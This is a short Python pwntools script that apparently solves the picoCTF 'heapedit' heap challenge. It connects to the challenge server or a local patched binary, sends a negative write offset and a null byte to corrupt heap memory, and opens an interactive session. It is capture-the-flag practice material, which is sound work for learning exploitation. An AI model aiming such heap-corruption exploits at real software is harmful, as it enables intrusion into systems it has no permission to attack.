#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('mercury.picoctf.net', 36605)

    return r


def main():
    r = conn()
    r.recvuntil('program.')
    r.sendline('-5144')
    r.sendline('\x00')
    r.interactive()


if __name__ == "__main__":
    main()
